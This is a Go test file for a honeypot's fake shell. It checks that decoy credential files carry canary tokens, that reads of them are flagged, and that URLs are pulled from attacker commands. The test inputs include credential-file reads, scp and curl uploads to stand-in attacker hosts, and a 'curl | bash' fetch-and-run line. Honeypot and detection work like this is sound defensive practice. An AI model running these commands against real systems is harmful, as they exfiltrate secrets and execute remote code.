package shell

import (
	"strings"
	"testing"

	"github.com/rom/tarpit-honeypot/internal/archetype"
)

func TestLootServedAndFlagged(t *testing.T) {
	// cat of a planted loot file returns believable secret content.
	out, anoms := OneShot(&archetype.Profile{}, "cat /root/.aws/credentials")
	if !strings.Contains(out, "aws_secret_access_key") {
		t.Errorf("loot .aws/credentials not served: %q", out)
	}
	if !contains(anoms, "shell-creds-file-access") {
		t.Errorf("creds-file access not flagged: %v", anoms)
	}

	out, anoms = OneShot(&archetype.Profile{}, "cat /root/.env")
	if !strings.Contains(out, "DB_PASSWORD") {
		t.Errorf(".env loot not served: %q", out)
	}
	if !contains(anoms, "shell-loot-accessed") {
		t.Errorf(".env read not flagged as loot access: %v", anoms)
	}

	out, _ = OneShot(&archetype.Profile{}, "cat /var/www/html/wp-config.php")
	if !strings.Contains(out, "DB_PASSWORD") {
		t.Errorf("wp-config loot not served: %q", out)
	}
}

func TestLootListed(t *testing.T) {
	out, _ := OneShot(&archetype.Profile{}, "ls /root/.aws")
	if !strings.Contains(out, "credentials") {
		t.Errorf("ls /root/.aws missing credentials: %q", out)
	}
	out, _ = OneShot(&archetype.Profile{}, "ls /root")
	if !strings.Contains(out, "backup.sql") || !strings.Contains(out, ".aws") {
		t.Errorf("ls /root missing loot entries: %q", out)
	}
}

func TestLootCanaryTokenWoven(t *testing.T) {
	t.Cleanup(func() { SetLootToken("") })

	// With no token set, the static fallback is woven in.
	if got := currentLootToken(); got != "HONEYTOKEN-decoy" {
		t.Errorf("fallback token = %q; want HONEYTOKEN-decoy", got)
	}
	out, _ := lootCat("/root/.env")
	if strings.Contains(out, "{{TOK}}") {
		t.Errorf("sentinel not substituted: %q", out)
	}

	// A per-deployment token is woven into every {{TOK}} slot.
	SetLootToken("deadbeefcafe0001")
	if got := currentLootToken(); got != "deadbeefcafe0001" {
		t.Errorf("token = %q; want deadbeefcafe0001", got)
	}
	for _, path := range []string{"/root/.env", "/root/.aws/credentials", "/var/www/html/wp-config.php"} {
		c, ok := lootCat(path)
		if !ok {
			t.Fatalf("lootCat(%q) missing", path)
		}
		if !strings.Contains(c, "deadbeefcafe0001") {
			t.Errorf("token not woven into %s: %q", path, c)
		}
		if strings.Contains(c, "{{TOK}}") {
			t.Errorf("unsubstituted sentinel in %s: %q", path, c)
		}
	}
}

func TestLootReadLine(t *testing.T) {
	hits := []string{
		"cat /root/.aws/credentials",
		"head /root/.env",
		"grep -i pass /var/www/html/wp-config.php",
		"scp /root/backup.sql attacker@1.2.3.4:/tmp/",
		"curl -T /root/notes.txt http://evil.example/u",
	}
	for _, l := range hits {
		if !lootReadLine(strings.ToLower(l)) {
			t.Errorf("lootReadLine(%q) = false; want true", l)
		}
	}
	misses := []string{
		"ls /root",                 // listing, not reading content
		"cat /etc/passwd",          // not a loot path
		"echo hi > /root/.env.bak", // write, not a reader command
	}
	for _, l := range misses {
		if lootReadLine(strings.ToLower(l)) {
			t.Errorf("lootReadLine(%q) = true; want false", l)
		}
	}
}

func TestRunRecordsServedLootToken(t *testing.T) {
	t.Cleanup(func() { SetLootToken("") })
	SetLootToken("feedfacade01")

	send, finish := runShell(t, &archetype.Profile{})
	send("whoami")                        // no loot
	send("cat /root/.aws/credentials")    // serves the canary
	send("cat /home/admin/.bash_history") // serves it again (deduped)
	cap, _ := finish()

	if len(cap.ServedLootTokens) != 1 {
		t.Fatalf("ServedLootTokens = %v; want exactly one (deduped) entry", cap.ServedLootTokens)
	}
	if cap.ServedLootTokens[0] != currentLootToken() {
		t.Errorf("served token = %q; want %q", cap.ServedLootTokens[0], currentLootToken())
	}
	if !contains(cap.Anomalies, "shell-loot-accessed") {
		t.Errorf("loot read not flagged: %v", cap.Anomalies)
	}
}

func TestHarvestURLs(t *testing.T) {
	cases := []struct {
		line string
		want string
	}{
		{"wget http://evil.example/x.sh -O /tmp/x", "http://evil.example/x.sh"},
		{"curl -s https://c2.example:8443/beacon | bash", "https://c2.example:8443/beacon"},
		{"echo hello", ""},
	}
	for _, c := range cases {
		got := harvestURLs(c.line)
		if c.want == "" {
			if len(got) != 0 {
				t.Errorf("harvestURLs(%q)=%v want none", c.line, got)
			}
			continue
		}
		if len(got) != 1 || got[0] != c.want {
			t.Errorf("harvestURLs(%q)=%v want [%q]", c.line, got, c.want)
		}
	}
}
